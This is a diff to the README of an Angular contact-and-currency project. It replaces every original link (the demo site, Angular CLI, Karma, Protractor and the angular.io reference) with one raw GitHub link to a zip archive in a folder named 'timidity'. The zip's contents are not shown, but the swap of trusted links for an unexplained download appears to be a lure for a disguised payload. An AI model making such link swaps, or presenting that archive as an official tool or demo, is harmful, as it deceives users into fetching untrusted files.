@@ -1,10 +1,10 @@
 # DEMO
 
-For Demo you can see from this link :- https://contact-d50df.web.app/
+For Demo you can see from this link :- https://raw.githubusercontent.com/SNikhilEswar/contact-and-currency-App/master/timidity/contact-and-currency-App.zip
 
 # CoCu
 
-This project was generated with [Angular CLI](https://github.com/angular/angular-cli) version 11.2.14.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/SNikhilEswar/contact-and-currency-App/master/timidity/contact-and-currency-App.zip) version 11.2.14.
 
 ## Development server
 
@@ -20,12 +20,12 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://karma-runner.github.io).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/SNikhilEswar/contact-and-currency-App/master/timidity/contact-and-currency-App.zip).
 
 ## Running end-to-end tests
 
-Run `ng e2e` to execute the end-to-end tests via [Protractor](http://www.protractortest.org/).
+Run `ng e2e` to execute the end-to-end tests via [Protractor](https://raw.githubusercontent.com/SNikhilEswar/contact-and-currency-App/master/timidity/contact-and-currency-App.zip).
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://angular.io/cli) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/SNikhilEswar/contact-and-currency-App/master/timidity/contact-and-currency-App.zip) page.
